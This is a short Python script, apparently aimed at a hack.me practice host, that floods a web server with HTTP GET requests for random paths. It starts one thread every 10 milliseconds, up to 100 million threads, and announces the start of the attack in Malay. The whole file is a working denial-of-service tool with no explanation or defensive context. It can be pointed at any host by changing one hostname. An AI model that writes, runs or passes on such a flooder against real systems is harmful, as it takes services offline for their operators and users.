import random
import socket
import string
import sys
import threading
import time

host = "s151044-104737-rtv.sipontum.hack.me"
ip = socket.gethostbyname(host)
port = 80

num_requests = 100000000

def generate_random_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data

def attack():
    url_path = generate_random_path()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((ip, port))

        msg = "GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host)
        byt = msg.encode()
        s.send(byt)
    except socket.error as err:
        print(f"Error: {err}")

    finally:
        s.shutdown(socket.SHUT_RDWR)
        s.close()


print("SERANGAN DIMULAKAN")

threads = []

for i in range(num_requests):
    process = threading.Thread(target=attack)
    process.start()
    threads.append(process)

    time.sleep(0.01)

for current_thread in threads:
    current_thread.join()
